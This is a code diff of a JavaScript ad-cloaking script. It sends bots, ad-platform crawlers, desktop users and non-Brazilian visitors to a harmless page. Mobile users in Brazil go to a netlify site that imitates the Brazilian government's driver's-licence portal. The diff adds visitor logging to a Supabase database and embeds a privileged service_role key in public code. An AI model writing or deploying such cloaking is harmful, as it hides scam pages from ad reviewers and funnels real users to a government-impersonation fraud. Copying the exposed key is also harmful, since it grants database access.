@@ -10,8 +10,9 @@
 (function(){
   var WHITE = "https://simuladodetranbrasil.com.br/apostilas-cnh-detran/";
   var BLACK = "https://novacnh-brasil-gov-br.netlify.app/";
+  var SB_URL = "https://ldyhodwdhavrgyooukpi.supabase.co";
+  var SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxkeWhvZHdkaGF2cmd5b291a3BpIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc4NjQxMDUyNCwiZXhwIjoyMTAxOTg2NTI0fQ.JvEtOi46gaL5fAFk8XnUUeEyPTibpC79NwPGMF8SvdY";
 
-  // Bot User-Agents conhecidos incluindo crawlers do Facebook/Meta
   var BOT_UA = [
     "facebookexternalhit","facebot","meta-externalagent","meta-externalfetcher",
     "linkedinbot","twitterbot","applebot","googlebot","bingbot","slurp",
@@ -29,7 +30,6 @@
     for (var i = 0; i < BOT_UA.length; i++) {
       if (ua.indexOf(BOT_UA[i]) !== -1) return true;
     }
-    // Detecta automação
     if (navigator.webdriver) return true;
     if (window._phantom || window.callPhantom) return true;
     if (window.__nightmare) return true;
@@ -43,49 +43,64 @@
 
   function appendUtms(url) {
     var params = new URLSearchParams(window.location.search);
-    var utmKeys = ["utm_source","utm_medium","utm_campaign","utm_content","utm_term","fbclid","ttclid","gclid","src","sck"];
-    var destParams = new URLSearchParams();
-    utmKeys.forEach(function(k) {
-      var v = params.get(k);
-      if (v) destParams.set(k, v);
-    });
-    var qs = destParams.toString();
-    if (!qs) return url;
-    return url + (url.indexOf("?") === -1 ? "?" : "&") + qs;
+    var keys = ["utm_source","utm_medium","utm_campaign","utm_content","utm_term","fbclid","ttclid","gclid","src","sck"];
+    var dest = new URLSearchParams();
+    keys.forEach(function(k){ var v=params.get(k); if(v) dest.set(k,v); });
+    var qs = dest.toString();
+    return qs ? url + (url.indexOf("?") === -1 ? "?" : "&") + qs : url;
   }
 
-  function goTo(url) {
-    window.location.replace(url);
+  function logCloaker(result, reason, country) {
+    try {
+      fetch(SB_URL + "/rest/v1/cloaker_logs", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "apikey": SB_KEY,
+          "Authorization": "Bearer " + SB_KEY
+        },
+        body: JSON.stringify({
+          user_agent: navigator.userAgent,
+          result: result,
+          reason: reason,
+          country: country || "?"
+        })
+      });
+    } catch(e) {}
   }
 
-  // 1. Bot detectado → white
-  if (isBot()) {
-    goTo(WHITE);
+  var botDetected = isBot();
+  var mobile = isMobile();
+
+  if (botDetected) {
+    logCloaker("BOT", "User-agent bot detectado", "?");
+    window.location.replace(WHITE);
     return;
   }
 
-  // 2. Desktop → white
-  if (!isMobile()) {
-    goTo(WHITE);
+  if (!mobile) {
+    logCloaker("BLOCKED", "Desktop bloqueado", "?");
+    window.location.replace(WHITE);
     return;
   }
 
-  // 3. Mobile → verifica país via API
+  // Mobile — verifica país
   fetch("https://ipapi.co/json/", { signal: AbortSignal.timeout(3000) })
     .then(function(r){ return r.json(); })
     .then(function(data){
-      var country = (data.country_code || "").toUpperCase();
+      var country = (data.country_code || "?").toUpperCase();
       if (country === "BR") {
-        goTo(appendUtms(BLACK));
+        logCloaker("REAL", "Mobile Brasil", country);
+        window.location.replace(appendUtms(BLACK));
       } else {
-        goTo(WHITE);
+        logCloaker("BLOCKED", "IP fora do Brasil (" + country + ")", country);
+        window.location.replace(WHITE);
       }
     })
     .catch(function(){
-      // Se falhar a verificação de IP, deixa passar (mobile já validado)
-      goTo(appendUtms(BLACK));
+      logCloaker("REAL", "Mobile - IP check falhou, permitido", "?");
+      window.location.replace(appendUtms(BLACK));
     });
-
 })();
 </script>
 </body>
